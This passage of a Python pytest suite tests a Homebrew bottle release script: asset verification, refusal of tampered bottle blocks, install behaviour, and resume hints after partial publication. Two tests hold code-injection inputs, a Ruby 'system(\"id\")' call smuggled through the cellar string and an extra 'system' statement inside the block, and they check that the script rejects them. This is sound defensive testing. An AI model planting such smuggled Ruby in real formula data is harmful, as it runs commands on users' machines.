        monkeypatch, release, cut, runs=[{"databaseId": 8, "headSha": TAG_SHA}], doc=doc
    )
    with pytest.raises(release.ReleaseError, match="exactly one entry"):
        release.fetch_bottle(cut, tmp_path, dry_run=False)


def test_fetch_bottle_refuses_a_ci_build_of_another_source_archive(
    monkeypatch, release, cut, tmp_path
):
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
        source="6" * 64,
    )
    with pytest.raises(release.ReleaseError, match="different source archive") as seen:
        release.fetch_bottle(cut, tmp_path, dry_run=False)
    # The integrity refusal must still tell the operator what to do (a false
    # flag here would pass it through bare: adversary X1, twelfth review).
    assert release.BOTTLE_FALLBACK_HINT in str(seen.value)
    assert seen.value.self_sufficient is True


def test_fetch_bottle_refuses_an_artifact_without_the_source_hash(
    monkeypatch, release, cut, tmp_path
):
    fake_bottle_run(
        monkeypatch,
        release,
        cut,
        runs=[{"databaseId": 8, "headSha": TAG_SHA}],
        source=None,
    )
    with pytest.raises(release.ReleaseError, match="lacks source.sha256"):
        release.fetch_bottle(cut, tmp_path, dry_run=False)


def write_bottle_json(release, cut, tmp_path) -> Path:
    path = tmp_path / f"sudo-secretspec--{cut.version}.bottle.json"
    path.write_text(json.dumps(bottle_json(release, cut)), encoding="utf-8")
    return path


def test_verify_release_assets_accepts_an_asset_matching_the_json(
    monkeypatch, release, cut, tmp_path
):
    calls = fake_bottle_run(monkeypatch, release, cut, runs=[])
    path = write_bottle_json(release, cut, tmp_path)
    release.verify_release_assets(cut, [path], dry_run=False)
    download = next(a for a in calls if a[:3] == ["gh", "release", "download"])
    assert download[3:6] == [cut.tag, "-R", release.FORK_REPO]
    assert download[download.index("--pattern") + 1] == (
        f"sudo-secretspec-{cut.version}.arm64_tahoe.bottle.tar.gz"
    )


def test_verify_release_assets_refuses_a_replaced_asset(
    monkeypatch, release, cut, tmp_path
):
    fake_bottle_run(monkeypatch, release, cut, runs=[], asset=b"replaced")
    path = write_bottle_json(release, cut, tmp_path)
    with pytest.raises(release.ReleaseError, match="the tap was not touched"):
        release.verify_release_assets(cut, [path], dry_run=False)


def test_verify_release_assets_names_a_missing_asset(
    monkeypatch, release, cut, tmp_path
):
    def fake_run(argv, **kwargs):
        raise subprocess.CalledProcessError(1, argv, "", "no assets match")

    monkeypatch.setattr(release, "run", fake_run)
    path = write_bottle_json(release, cut, tmp_path)
    with pytest.raises(release.ReleaseError, match="cannot download release asset"):
        release.verify_release_assets(cut, [path], dry_run=False)


def test_merge_bottle_pushes_nothing_when_the_release_asset_differs(
    monkeypatch, release, cut, tmp_path
):
    calls = fake_bottle_run(monkeypatch, release, cut, runs=[], asset=b"replaced")
    path = write_bottle_json(release, cut, tmp_path)
    with pytest.raises(release.ReleaseError):
        release.merge_bottle(cut, tmp_path / "clone", [path], dry_run=False)
    assert not any(a[:2] in (["git", "push"], ["brew", "bottle"]) for a in calls)


def merged_block(release, cut, *, cellar="cellar: :any, ", extra="", sha=BOTTLE_SHA):
    """The `bottle do` block `brew bottle --merge --write` writes for bottle_json."""
    return (
        "  bottle do\n"
        f'    root_url "https://github.com/{release.FORK_REPO}/releases/download/{cut.tag}"\n'
        f'{extra}    sha256 {cellar}arm64_tahoe: "{sha}"\n'
        "  end\n"
    )


def merge_with_written_block(monkeypatch, release, cut, tmp_path, written):
    """Run merge_bottle with `brew bottle --merge` writing `written`; return calls."""
    checkout = tmp_path / "brew-tap"
    clone = tmp_path / "clone"
    for tap in (checkout, clone):
        (tap / "Formula").mkdir(parents=True)
        (tap / "Formula/sudo-secretspec.rb").write_text(f'url "{cut.tag}"\n')
    jsons = [write_bottle_json(release, cut, tmp_path)]
    calls = []

    def fake_run(argv, *, cwd=None, env=None, **kwargs):
        calls.append((argv, cwd))
        if argv[:3] == ["gh", "release", "download"]:
            asset = Path(argv[argv.index("-D") + 1]) / argv[argv.index("--pattern") + 1]
            asset.write_bytes(BOTTLE_BYTES)
        if argv[:2] == ["brew", "--repository"]:
            return completed(argv, f"{checkout}\n")
        if argv[:3] == ["brew", "bottle", "--merge"]:
            (checkout / "Formula/sudo-secretspec.rb").write_text(
                f'url "{cut.tag}"\n' + written
            )
        return completed(argv)

    monkeypatch.setattr(release, "run", fake_run)
    try:
        release.merge_bottle(cut, clone, jsons, dry_run=False)
    except release.ReleaseError as error:
        return calls, error, checkout
    return calls, None, checkout


def test_merge_bottle_accepts_homebrews_column_padding_and_default_cellars(
    monkeypatch, release, cut, tmp_path
):
    # Homebrew omits `cellar:` for its default cellars and pads the columns.
    path = tmp_path / "x"
    path.mkdir()
    doc = bottle_json(release, cut, cellar="/opt/homebrew/Cellar", rebuild=2)
    (path / "j.json").write_text(json.dumps(doc), encoding="utf-8")
    lines = release.bottle_block_lines(cut, [path / "j.json"])
    assert lines[2:4] == ["rebuild 2", f'sha256 arm64_tahoe: "{BOTTLE_SHA}"']
    written = (
        f'  bottle do\n    root_url "https://github.com/frdminc/sudo-secretspec/'
        f'releases/download/{cut.tag}"\n    rebuild 2\n'
        f'    sha256 arm64_tahoe:   "{BOTTLE_SHA}"\n  end\n'
    )
    assert release.written_bottle_block(written) == lines


@pytest.mark.parametrize(
    "written",
    [
        # The N1 payload: Ruby smuggled through the cellar string.
        'cellar: "x\\", system(\\"id\\"), \\"", ',
        # A different cellar than the validated JSON names.
        "cellar: :any_skip_relocation, ",
        "",
    ],
)
def test_merge_bottle_commits_nothing_when_the_written_block_differs(
    monkeypatch, release, cut, tmp_path, written
):
    calls, error, checkout = merge_with_written_block(
        monkeypatch, release, cut, tmp_path, merged_block(release, cut, cellar=written)
    )
    assert error is not None and "differs from the one the validated" in str(error)
    argvs = [argv for argv, _cwd in calls]
    assert not any(
        a[:2] in (["git", "add"], ["git", "commit"], ["git", "push"]) for a in argvs
    )
    assert not any(a[:3] == ["git", "push", "origin"] for a in argvs)
    # Homebrew's checkout is put back even though the merge was refused.
    assert (["git", "checkout", "--", "Formula/sudo-secretspec.rb"], checkout) in calls
    assert (
        not (tmp_path / "clone" / "Formula/sudo-secretspec.rb")
        .read_text()
        .count("bottle do")
    )


@pytest.mark.parametrize(
    "block",
    [
        # An extra statement inside the block.
        lambda r, c: merged_block(r, c, extra='    system "id"\n'),
        # A second bottle block.
        lambda r, c: merged_block(r, c) + merged_block(r, c),
        # A different digest than the one the JSON, and so the tarball, has.
        lambda r, c: merged_block(r, c, sha="b" * 64),
    ],
)
def test_merge_bottle_refuses_an_altered_block_shape(
    monkeypatch, release, cut, tmp_path, block
):
    calls, error, _checkout = merge_with_written_block(
        monkeypatch, release, cut, tmp_path, block(release, cut)
    )
    assert error is not None
    assert not any(argv[:2] == ["git", "push"] for argv, _cwd in calls)
    assert not any(argv[:2] == ["git", "commit"] for argv, _cwd in calls)


def test_merge_bottle_writes_the_block_and_pushes_the_tap_clone(
    monkeypatch, release, cut, tmp_path
):
    checkout = tmp_path / "brew-tap"
    clone = tmp_path / "clone"
    for tap in (checkout, clone):
        (tap / "Formula").mkdir(parents=True)
        (tap / "Formula/sudo-secretspec.rb").write_text(f'url "{cut.tag}"\n')
    jsons = [write_bottle_json(release, cut, tmp_path)]
    calls = []

    def fake_run(argv, *, cwd=None, env=None, **kwargs):
        calls.append((argv, cwd))
        if argv[:3] == ["gh", "release", "download"]:
            asset = Path(argv[argv.index("-D") + 1]) / argv[argv.index("--pattern") + 1]
            asset.write_bytes(BOTTLE_BYTES)
        if argv[:2] == ["brew", "--repository"]:
            return completed(argv, f"{checkout}\n")
        if argv[:3] == ["brew", "bottle", "--merge"]:
            assert env == release.BREW_ENV
            (checkout / "Formula/sudo-secretspec.rb").write_text(
                f'url "{cut.tag}"\n' + merged_block(release, cut)
            )
        return completed(argv)

    monkeypatch.setattr(release, "run", fake_run)
    release.merge_bottle(cut, clone, jsons, dry_run=False)
    argvs = [argv for argv, _cwd in calls]
    merge = ["brew", "bottle", "--merge", "--write", "--no-commit", str(jsons[0])]
    assert merge in argvs
    assert "bottle do" in (clone / "Formula/sudo-secretspec.rb").read_text()
    # Homebrew's checkout is put back so the next refresh fast-forwards it.
    assert (["git", "checkout", "--", "Formula/sudo-secretspec.rb"], checkout) in calls
    assert (["git", "push", "origin", "HEAD"], clone) in calls
    assert argvs.index(merge) < argvs.index(["git", "push", "origin", "HEAD"])
    # The published asset is compared before the tap is touched.
    download = next(a for a in argvs if a[:3] == ["gh", "release", "download"])
    assert argvs.index(download) < argvs.index(merge)


def test_merge_bottle_refuses_a_formula_that_gained_no_bottle_block(
    monkeypatch, release, cut, tmp_path
):
    checkout = tmp_path / "brew-tap"
    (checkout / "Formula").mkdir(parents=True)
    (checkout / "Formula/sudo-secretspec.rb").write_text(f'url "{cut.tag}"\n')

    def fake_run(argv, **kwargs):
        return completed(
            argv, f"{checkout}\n" if argv[:2] == ["brew", "--repository"] else ""
        )

    monkeypatch.setattr(release, "run", fake_run)
    with pytest.raises(release.ReleaseError, match="--build-from-source"):
        release.merge_bottle(cut, tmp_path / "clone", [], dry_run=False)


def test_install_pours_the_bottle_and_never_builds_from_source(
    monkeypatch, release, cut
):
    calls = []

    def fake_run(argv, **kwargs):
        calls.append((argv, kwargs))
        return completed(argv, "/opt/homebrew/opt/sudo-secretspec\n")

    monkeypatch.setattr(release, "run", fake_run)
    release.brew_install_and_test(build_from_source=False, dry_run=False)
    install = next(a for a, _k in calls if a[:2] == ["brew", "reinstall"])
    assert install == ["brew", "reinstall", "--force-bottle", release.FORMULA_NAME]
    assert "--build-from-source" not in " ".join(" ".join(a) for a, _k in calls)
    assert calls[0][1]["env"]["HOMEBREW_NO_INSTALL_FROM_API"] == "1"
    assert any(a[:2] == ["brew", "test"] for a, _k in calls)


def test_install_with_no_pourable_bottle_is_an_error_not_a_compile(
    monkeypatch, release
):
    def fake_run(argv, **kwargs):
        return completed(argv, returncode=1 if argv[:2] == ["brew", "reinstall"] else 0)

    monkeypatch.setattr(release, "run", fake_run)
    with pytest.raises(release.ReleaseError, match="--build-from-source"):
        release.brew_install_and_test(build_from_source=False, dry_run=False)


def test_build_from_source_compiles_through_bg_from_home(monkeypatch, release):
    calls = []

    def fake_run(argv, **kwargs):
        calls.append((argv, kwargs))
        return completed(argv, "/opt/homebrew/opt/sudo-secretspec\n")

    monkeypatch.setattr(release, "run", fake_run)
    release.brew_install_and_test(build_from_source=True, dry_run=True)
    argv, kwargs = calls[0]
    assert argv[0].endswith("ops/site-private/bin/bg")
    assert argv[1:] == [
        "brew",
        "reinstall",
        "--build-from-source",
        release.FORMULA_NAME,
    ]
    # bg refuses a build whose cwd is a CI-first repo; brew never reads this one.
    assert kwargs["cwd"] == Path.home()
    assert kwargs["env"]["HOMEBREW_MAKE_JOBS"] == "1"


@pytest.mark.parametrize("where", ["preflight", "inside_the_guarded_block"])
def test_a_pre_publication_failure_does_not_claim_the_release_is_published(
    monkeypatch, release, cut, where
):
    """RESUME_BY_HAND_HINT is a factual claim and a directive -- "the tag and
    Release are already published, do not re-run `just release`". The justfile's
    RESUME RULES make the pre- and post-publication cases opposite: before the
    tag, "fix, then re-run"; after it, "do NOT re-run".

    A blanket `except OSError` in `__main__` appended the hint to everything,
    so `git`, `cargo` or `gh` missing from PATH in preflight -- or a mistyped
    `--notes-file` -- told the operator not to re-run when re-running was the
    only correct action. Reproduced verbatim by the reviewer against a copy of
    the script under an empty PATH (adversary F1, 2026-10-23).
    """

    def missing_git(*_a, **_k):
        raise FileNotFoundError(2, "No such file or directory", "git")

    monkeypatch.setattr(release, "run", lambda argv, **kwargs: completed(argv))
    if where == "preflight":
        # The reported scenario: PATH without git/cargo/gh, nothing published.
        monkeypatch.setattr(release, "preflight", missing_git)
    else:
        # The case that actually pins the guard: inside the block `main`
        # wraps, but before the push sets `state.tag_pushed`. Without this
        # case the test passes even with the scoping removed, because
        # `preflight` runs outside the guarded block entirely -- a test true
        # for the wrong reason, which is the trap this whole review chain
        # keeps finding (mutation M9, 2026-10-23).
        monkeypatch.setattr(release, "preflight", lambda _release, **kwargs: None)
        monkeypatch.setattr(release, "create_tag_and_release", missing_git)

    with pytest.raises(FileNotFoundError) as caught:
        release.main(["--version", cut.version, "--skip-tests"])
    assert release.RESUME_BY_HAND_HINT not in str(caught.value)


@pytest.mark.parametrize(
    "error",
    [
        OSError("disk gone"),
        ValueError("Expecting value: line 1 column 1 (char 0)"),
        RuntimeError("nobody enumerated this one"),
    ],
    ids=["oserror", "valueerror", "runtimeerror"],
)
def test_any_post_publication_failure_names_the_resume_path(
    monkeypatch, release, cut, error
):
    """Once the tag is pushed the release cannot be re-run, so every failure
    from there on has to carry the resume path -- whatever its type.

    The ValueError case is not hypothetical: `verify_readback` calls
    `json.loads` three times with no handler on the stack, and a `gh` that
    exits 0 with non-JSON raises `JSONDecodeError`, a ValueError. The handler
    this replaced caught only OSError while its comment claimed to catch
    everything nobody enumerated (adversary F3, 2026-10-23).
    """

    # Fully published: tag pushed AND the Release created, which is what
    # RESUME_BY_HAND_HINT claims. The tag-pushed-only case is its own test.
    _published(monkeypatch, release)

    def boom(**_kwargs):
        raise error

    monkeypatch.setattr(release, "brew_install_and_test", boom)
    with pytest.raises(release.ReleaseError) as caught:
        release.main(["--version", cut.version, "--skip-tests"])
    message = str(caught.value)
    assert release.RESUME_BY_HAND_HINT in message
    assert str(error) in message
    # The type, too: __main__ turns this into a string-valued SystemExit,
    # which CPython prints with no traceback and no type name, so the message
    # is all the operator gets (adversary F2, 2026-10-23).
    assert type(error).__name__ in message, message


def _published(monkeypatch, release, *, release_created=True):
    """Stub everything up to the post-publication path, leaving the release
    "published" exactly as far as the caller asks.

    `tag_pushed` and `release_created` are set separately because
    `create_tag_and_release` sets them at different moments -- the push, then
    `gh release create` -- and the resume hint has to tell the two apart.
    """

    def publish(_release, _notes, state, **_kwargs):
        state.tag_pushed = True
        state.release_created = release_created

    monkeypatch.setattr(release, "preflight", lambda _release, **kwargs: None)
    monkeypatch.setattr(release, "run", lambda argv, **kwargs: completed(argv))
    monkeypatch.setattr(release, "create_tag_and_release", publish)
    monkeypatch.setattr(release, "fetch_bottle", lambda *a, **k: [])
    monkeypatch.setattr(release, "update_formula_commit", lambda *a, **k: None)
    monkeypatch.setattr(release, "sync_tap", lambda *a, **k: None)
    monkeypatch.setattr(release, "merge_bottle", lambda *a, **k: None)
    monkeypatch.setattr(release, "brew_refresh", lambda *a, **k: Path("/tap"))


# How many `ReleaseError`/`_require` calls declare themselves self-sufficient.
# Pinned as a number on purpose, so that adding or removing one is a visible
# diff in review rather than something the derived check absorbs silently.
SELF_SUFFICIENT_SITES = 18


def _release_error_calls(release):
    """Every `ReleaseError(...)`/`_require(...)` call in release.py, as
    (line, message expressions, declares self-sufficient, inside _require,
    is a _require call)."""
    tree = ast.parse(RELEASE_PY.read_text(encoding="utf-8"))
    # Only the module-level `_require` is exempt: a nested `def _require` must
    # not exempt itself (adversary N10, eleventh review, 2026-10-23).
    inside_require = {
        inner.lineno
        for fn in tree.body
        if isinstance(fn, ast.FunctionDef) and fn.name == "_require"
        for inner in ast.walk(fn)
        # `ast.arguments` and similar helper nodes carry no position.
        if hasattr(inner, "lineno")
    }
    calls = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        called = (
            node.func.id
            if isinstance(node.func, ast.Name)
            else getattr(node.func, "attr", "")
        )
        if called not in {"ReleaseError", "_require"}:
            continue
        # Positional args AND keyword values, because a hint passed as
        # `message=...` is as real as one passed positionally (adversary A10).
        expressions = list(node.args) + [
            keyword.value
            for keyword in node.keywords
            if keyword.arg != "self_sufficient"
        ]
        # Anything but the literal `False` declares: a computed flag
        # (`bool(1)`, a module constant) is a false flag the count cannot see
        # (adversary B1/B2). `**kwargs` can smuggle the flag in unseen (B3).
        declares = False
        odd = []
        for keyword in node.keywords:
            if keyword.arg is None:
                odd.append("**kwargs")
            elif keyword.arg == "self_sufficient":
                literal = isinstance(keyword.value, ast.Constant) and isinstance(
                    keyword.value.value, bool
                )
                if not literal:
                    odd.append("computed self_sufficient")
                declares = declares or not (literal and keyword.value.value is False)
        calls.append(
            (
                node.lineno,
                expressions,
                declares,
                node.lineno in inside_require,
                called == "_require",
                odd,
            )
        )
    return calls


def _release_error_aliases():
    """Lines where `ReleaseError` or `_require` is subclassed or aliased: a
    subclass defaulting the flag to True, or `_Fail = ReleaseError`, builds
    errors the call scan never sees (adversary B5/N6/N7)."""
    tree = ast.parse(RELEASE_PY.read_text(encoding="utf-8"))
    watched = {"ReleaseError", "_require"}

    def names_watched(expression):
        return expression is not None and any(
            (isinstance(inner, ast.Name) and inner.id in watched)
            or (isinstance(inner, ast.Attribute) and inner.attr in watched)
            for inner in ast.walk(expression)
        )

    lines = []
    for node in ast.walk(tree):
        if isinstance(node, ast.ClassDef):
            # Any base that mentions the class, however it is spelled
            # (`sys.modules[__name__].ReleaseError`: adversary X11).
            if any(names_watched(base) for base in node.bases):
                lines.append(node.lineno)
        elif (
            isinstance(node, ast.Assign | ast.AnnAssign)
            and names_watched(node.value)
            and not (
                isinstance(node.value, ast.Call)
                and getattr(node.value.func, "id", "") in watched
            )
        ):
            # `_Fail = ReleaseError`, `_Fail: type = ...`; binding the RESULT of
            # `ReleaseError(...)` to a local is not an alias (adversary W8).
            lines.append(node.lineno)
        elif isinstance(node, ast.Call):
            callee = getattr(node.func, "id", getattr(node.func, "attr", ""))
            # `partial(ReleaseError, ...)` and `type("X", (ReleaseError,), {})`
            # build errors through a name the call scan does not know (X6b, X7).
            if callee in {"partial", "type"} and any(
                names_watched(arg) for arg in node.args
            ):
                lines.append(node.lineno)
            # The flag keyword belongs to a DIRECT `ReleaseError(`/`_require(`
            # call, which the call scan audits; on any other callee
            # (`type(error)(...)`, an aliased partial, an IfExp, a re-run
            # `__init__`) it flags an error nobody audits (adversary F1,
            # fourteenth review).
            if any(k.arg == "self_sufficient" for k in node.keywords) and not (
                isinstance(node.func, ast.Name) and node.func.id in watched
            ):
                lines.append(node.lineno)
    # The flag is read at catch time by the guards, so setting it after
    # construction is a false flag the constructor audit never sees (X1).
    # Syntax-matching the forms of a write (`x.f = ...`, a tuple target, a
    # `for` target, `setattr`, `__dict__`, `vars()`, a method on the class)
    # lost to a new form in each of two rounds, so the rule is closed instead:
    # ReleaseError holds a docstring and `__init__` and nothing else, only
    # `__init__` may mention the flag by name, and no reflective write exists.
    # The runtime fixture re-audits every instance built under test as well.
    init_body = set()
    for cls in ast.walk(tree):
        if isinstance(cls, ast.ClassDef) and cls.name == "ReleaseError":
            for member in cls.body:
                is_doc = isinstance(member, ast.Expr) and isinstance(
                    member.value, ast.Constant
                )
                if isinstance(member, ast.FunctionDef) and member.name == "__init__":
                    init_body.update(id(inner) for inner in ast.walk(member))
                elif not is_doc:
                    lines.append(member.lineno)  # a method, classmethod, attribute
    reflective = {"setattr", "vars", "__setattr__", "__dict__"}
    for node in ast.walk(tree):
        if id(node) in init_body:
            continue
        stores_flag = (
            isinstance(node, ast.Attribute)
            and node.attr == "self_sufficient"
            and not isinstance(node.ctx, ast.Load)
        )
        reflective_use = (
            isinstance(node, ast.Attribute) and node.attr in reflective
        ) or (isinstance(node, ast.Name) and node.id in reflective)
        names_flag = isinstance(node, ast.Constant) and node.value == "self_sufficient"
        if stores_flag or reflective_use or names_flag:
            lines.append(node.lineno)
    return sorted(set(lines))


def test_self_sufficient_is_declared_exactly_where_a_hint_is_carried(release):
    """The flag and the hint have to agree in BOTH directions.

    A hint-carrying raise site that forgets `self_sufficient=True` gets a
    second, conflicting hint appended -- the doubled-"already published"
    defect that shipped in 0c19acb and 2efe431. A site flagged WITHOUT a hint
    is the opposite and worse failure: both wraps pass it through untouched, so
    the operator gets no route at all. Five such false flags, including one on
    `fetch_bottle`'s `source.sha256` integrity check, passed all 143 tests when
    only the first direction was checked (adversary G1, tenth review,
    2026-10-23).

    The set of hint names is read off the module, not listed here, and the
    message is scanned in positional AND keyword arguments (A10). A message
    held in a local variable is refused outright (A9): `msg = f"...{HINT}";
    raise ReleaseError(msg)` hides the hint from any syntactic check, and the
    one legitimate bare name is `_require`'s own pass-through of `message`.
    """
    hint_names = {name for name in dir(release) if name.endswith("_HINT")}
    assert len(hint_names) >= 4, hint_names
    # `main` composes through a local named `hint`, chosen between two
    # constants, so the local counts as carrying one.
    carriers = hint_names | {"hint"}

    def carries(expressions):
        return any(
            isinstance(inner, ast.Name) and inner.id in carriers
            for expression in expressions
            for inner in ast.walk(expression)
        )

    disagree, hidden, flagged, unseen = [], [], 0, []
    for (
        line,
        expressions,
        declares,
        in_require,
        called_require,
        odd,
    ) in _release_error_calls(release):
        if in_require:
            continue
        unseen += [(line, kind) for kind in odd]
        flagged += declares
        if carries(expressions) != declares:
            disagree.append(
                (line, "carries a hint" if carries(expressions) else "no hint")
            )
        # The message argument itself may not be an opaque local. For
        # `_require(condition, message)` that is the second positional; for
        # `ReleaseError(message)` the first.
        message = expressions[1] if called_require else expressions[0]
        if isinstance(message, ast.Name) and message.id not in carriers:
            hidden.append(line)
    assert unseen == [], f"forms this check cannot read, at release.py lines: {unseen}"
    assert _release_error_aliases() == [], "ReleaseError/_require subclassed or aliased"
    assert disagree == [], f"flag and hint disagree at release.py lines: {disagree}"
    assert hidden == [], f"message hidden in a local at release.py lines: {hidden}"
    assert flagged == SELF_SUFFICIENT_SITES, flagged


@pytest.mark.parametrize(
    ("hint_name", "already_published_count"),
    [("BOTTLE_FALLBACK_HINT", 1), ("HEAD_KEG_HINT", 0)],
    ids=["bottle_fallback", "head_keg"],
)
def test_a_failure_that_already_names_its_remedy_is_not_given_a_second_one(
    monkeypatch, release, cut, hint_name, already_published_count
):
    """Every self-sufficient hint already says how far the release got and
    names the one route out of its own failure. Appending the
    generic hint on top states the claim twice, joined by "..", with two
    conflicting recipes: `brew reinstall --build-from-source` from the bottle
    hint against the justfile's "pour the bottle", which is the step that just
    failed (adversary F1, 2026-10-23).

    The expected count is per-hint rather than a flat 1: BOTTLE_FALLBACK_HINT
    uses the phrase "already published" once, HEAD_KEG_HINT not at all (it says
    "The bottle this release published is fine"). Both numbers go UP by one the
    moment the guard stops covering that hint, so each case fails on the bug
    while asserting the true text of its own hint.
    """
    hint = getattr(release, hint_name)
    if hint_name == "HEAD_KEG_HINT":
        hint = hint.format(keg="sudo-secretspec/HEAD-7c1f700")
    _published(monkeypatch, release)

    def boom(**_kwargs):
        raise release.ReleaseError(
            f"no usable macOS bottle for the tag\n{hint}", self_sufficient=True
        )

    monkeypatch.setattr(release, "brew_install_and_test", boom)
    with pytest.raises(release.ReleaseError) as caught:
        release.main(["--version", cut.version, "--skip-tests"])
    message = str(caught.value)
    assert message.count("already published") == already_published_count, message
    # Neither generic hint was appended, and the error's own remedy survived
    # whole -- the point of passing it through rather than re-dressing it.
    assert release.RESUME_BY_HAND_HINT not in message
    assert release.RESUME_TAG_ONLY_HINT not in message
    assert hint in message
    assert ".." not in message


@pytest.mark.parametrize("gh_fails", [False, True], ids=["created", "gh_failed"])
def test_release_created_is_set_only_once_gh_release_create_returns(
    monkeypatch, release, cut, gh_fails
):
    """The flag the resume wording depends on, pinned where it is actually
    assigned.

    Every other test in this file stubs `create_tag_and_release` and sets both
    flags by hand, so flipping the real `state.release_created = True` to
    `False` left all 133 tests green (mutation M22, 2026-10-23) -- the same
    shape as the M9 miss: a guard whose only test never reaches the code that
    sets it. This test runs the real function.
    """
    state = release.CleanupState()
    monkeypatch.setattr(release, "output", lambda argv, **kwargs: "")

    def fake_run(argv, **kwargs):
        if gh_fails and argv[:3] == ["gh", "release", "create"]:
            raise subprocess.CalledProcessError(1, argv, stderr="release exists\n")
        return completed(argv)

    monkeypatch.setattr(release, "run", fake_run)

    if gh_fails:
        with pytest.raises(subprocess.CalledProcessError):
            release.create_tag_and_release(cut, "notes", state, dry_run=False)
        # The tag is out there, but there is no Release to finish from.
        assert state.tag_pushed is True
        assert state.release_created is False
    else:
        release.create_tag_and_release(cut, "notes", state, dry_run=False)
        assert state.tag_pushed is True
        assert state.release_created is True


def test_release_created_survives_a_notes_file_that_cannot_be_closed(
    monkeypatch, release, cut
):
    """The flag is set INSIDE the `with`, right after the call that earns it.

    Outside it, an OSError out of `__exit__` -- an EIO or ENOSPC from the final
    `close()`, or an `unlink` failing with anything other than
    FileNotFoundError -- leaves the flag False after a fully successful
    `gh release create`, and the operator is then sent looking for a Release
    that exists. Restoring the pre-2efe431 placement left all 138 tests green
    (mutation NA, adversary F3, ninth review, 2026-10-23): the one test that
    runs the real function never made the block's exit fail, and every other
    test stubs the function and sets the flag by hand.
    """

    class ExplodingNotes:
        """A NamedTemporaryFile whose exit fails after a clean body."""

        def __init__(self, *_args, **_kwargs):
            self.name = "/tmp/notes-that-cannot-be-closed.md"

        def __enter__(self):
            return self

        def __exit__(self, *_exc):
            raise OSError(5, "I/O error")

        def write(self, _text):
            return None

        def flush(self):
            return None

    state = release.CleanupState()
    monkeypatch.setattr(release, "output", lambda argv, **kwargs: "")
    monkeypatch.setattr(release, "run", lambda argv, **kwargs: completed(argv))
    monkeypatch.setattr(
        release, "tempfile", types.SimpleNamespace(NamedTemporaryFile=ExplodingNotes)
    )

    with pytest.raises(OSError):
        release.create_tag_and_release(cut, "notes", state, dry_run=False)
    assert state.tag_pushed is True
    assert state.release_created is True


def test_a_post_publication_command_failure_keeps_the_command_output(
    monkeypatch, release, cut
):
    """`main`'s handler intercepts the CalledProcessError, so __main__'s own
    `except subprocess.CalledProcessError: raise SystemExit(describe(error))`
    can no longer fire for anything inside `_release_body`. Without the
    `describe` branch the operator loses the failed command's stderr -- the
    entire reason brew refused -- which is exactly what `describe` exists to
    prevent (adversary F3.1, 2026-10-23).
    """
    _published(monkeypatch, release)

    def boom(**_kwargs):
        raise subprocess.CalledProcessError(
            1,
            ["brew", "install", "sudo-secretspec"],
            stderr="Error: The `brew link` step did not complete successfully\n",
        )

    monkeypatch.setattr(release, "brew_install_and_test", boom)
    with pytest.raises(release.ReleaseError) as caught:
        release.main(["--version", cut.version, "--skip-tests"])
    message = str(caught.value)
    assert "brew link" in message, message
    assert release.RESUME_BY_HAND_HINT in message


def test_a_post_publication_failure_before_the_release_exists_says_so(
    monkeypatch, release, cut
):
    """`tag_pushed` is set between `git push` of the tag and `gh release
    create`, so a failure in between left the operator told "the tag AND
    Release are already published" when only the tag was -- and the
    justfile's hand-finish needs a Release that does not exist (adversary F4,
    2026-10-23).
    """
    _published(monkeypatch, release, release_created=False)

    def boom(**_kwargs):
        raise RuntimeError("gh release create failed")

    monkeypatch.setattr(release, "brew_install_and_test", boom)
    with pytest.raises(release.ReleaseError) as caught:
        release.main(["--version", cut.version, "--skip-tests"])
    message = str(caught.value)
    assert release.RESUME_TAG_ONLY_HINT in message, message
    assert release.RESUME_BY_HAND_HINT not in message
    assert "and Release are already published" not in message


def test_a_post_publication_interrupt_is_not_redressed_as_a_release_error(
    monkeypatch, release, cut
):
    """The handler catches `Exception`, not `BaseException`, so a
    `BaseException` from a non-signal source passes through as itself. Widening
    it is the natural wrong answer to "is there a post-publication path with no
    hint?", and nothing else in the suite would notice (mutation M18).

    Note what this does NOT describe. A real post-publication Ctrl-C does not
    raise `KeyboardInterrupt` at all: `interrupt_cleanup` replaces the SIGINT
    and SIGTERM handlers for the whole of `_release_body` with one that raises
    `ReleaseError("interrupted by SIGINT")`, and with a Python signal handler
    installed CPython never raises `KeyboardInterrupt`. That error is an
    `Exception`, so it is redressed and given the hint -- correctly, since the
    tag is out. Nothing inside `_release_body` raises `SystemExit` either. An
    earlier version of this docstring offered both as the scenario (adversary
    F4, 2026-10-23).
    """
    _published(monkeypatch, release)

    def boom(**_kwargs):
        raise KeyboardInterrupt

    monkeypatch.setattr(release, "brew_install_and_test", boom)
    with pytest.raises(KeyboardInterrupt):
        release.main(["--version", cut.version, "--skip-tests"])


@pytest.mark.parametrize(
    "kind", ["os_error", "unflagged_release_error"], ids=["os_error", "release_error"]
)
def test_an_error_that_merely_quotes_a_hint_still_gets_the_resume_path(
    monkeypatch, release, cut, kind
):
    """The guard reads `error.self_sufficient`, never the message, and both
    halves of `isinstance(error, ReleaseError) and error.self_sufficient` are
    load-bearing.

    An error whose text merely QUOTES a hint -- `gh` or `brew` stderr that
    echoed one back, a `_require` reporting a rejected field by printing its
    value -- must still get the resume path. Detecting self-sufficiency by
    substring is what made that fail: the fragment matched and the error was
    passed through with NO hint at all, which is the mirror image of the
    doubled hint and strictly worse, silence instead of noise. Dropping the
    `isinstance` half left all 135 tests green (mutation N4, adversary F3.1,
    2026-10-23); reading the message instead of the flag is what shipped in
    2efe431 (adversary F1, ninth review).
    """
    _published(monkeypatch, release)
    quoted = release.RESUME_BY_HAND_HINT

    def boom(**_kwargs):
        if kind == "os_error":
            raise OSError(f"brew said: {quoted}")
        # A ReleaseError that quotes a hint without declaring itself
        # self-sufficient: the flag says it is not, so the hint is appended.
        raise release.ReleaseError(f"tap formula mentions: {quoted}")

    monkeypatch.setattr(release, "brew_install_and_test", boom)
    with pytest.raises(release.ReleaseError) as caught:
        release.main(["--version", cut.version, "--skip-tests"])
    message = str(caught.value)
    assert release.RESUME_BY_HAND_HINT in message, message
    if kind == "os_error":
        assert "OSError" in message


def test_a_release_error_without_a_hint_is_not_prefixed_with_its_type(
    monkeypatch, release, cut
):
    """The three-way `detail` branch names the type for anything nobody
    enumerated, and deliberately does NOT for a ReleaseError, whose message is
    curated operator-facing prose. That arm was pinned by nothing: both
    `detail = f"{type(error).__name__}: {error}"` and `message = repr(error)`
    left all 135 tests green (mutations N7 and N9, adversary F3.2,
    2026-10-23), the second rendering the message as
    `ReleaseError('tap working tree is dirty: ...'). The tag and ...`.
    """
    _published(monkeypatch, release)

    def boom(**_kwargs):
